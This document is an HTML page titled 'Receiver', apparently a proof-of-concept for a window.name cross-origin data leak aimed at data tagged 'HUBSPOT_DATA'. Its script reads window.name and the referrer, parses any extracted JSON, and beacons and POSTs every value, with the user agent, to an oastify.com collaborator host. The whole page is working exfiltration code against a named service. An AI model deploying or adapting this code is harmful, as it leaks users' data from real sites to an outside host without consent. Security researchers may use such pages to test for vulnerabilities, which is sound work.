<!DOCTYPE html>
<html>
<head><title>Receiver</title></head>
<body>
<h1>Data Receiver</h1>
<div id="data" style="word-wrap:break-word;max-width:800px;"></div>
<script src="shared/exfil.js"></script>
<script>
var exfil = Exfil.create('https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com');

var name = window.name;
var ref = document.referrer;

document.getElementById('data').innerHTML = 
    '<strong>Window Name:</strong> ' + (name || '(empty)') + '<br><br>' +
    '<strong>Referrer:</strong> ' + (ref || '(none)') + '<br><br>' +
    '<strong>Length:</strong> ' + name.length + ' chars';

exfil.beacon('name', name);
exfil.beacon('ref', ref);
exfil.beacon('len', String(name.length));

if (name.startsWith('HUBSPOT_DATA:')) {
    var extracted = name.substring(13);
    exfil.beacon('extracted', extracted);
    
    try {
        var parsed = JSON.parse(extracted);
        exfil.beacon('parsed', 'success&keys=' + Object.keys(parsed).join(','));
    } catch(e) {
        exfil.beacon('parsed', 'failed');
    }
}

exfil.post('/data', {
    name: name,
    referrer: ref,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent
});
</script>
</body>
</html>
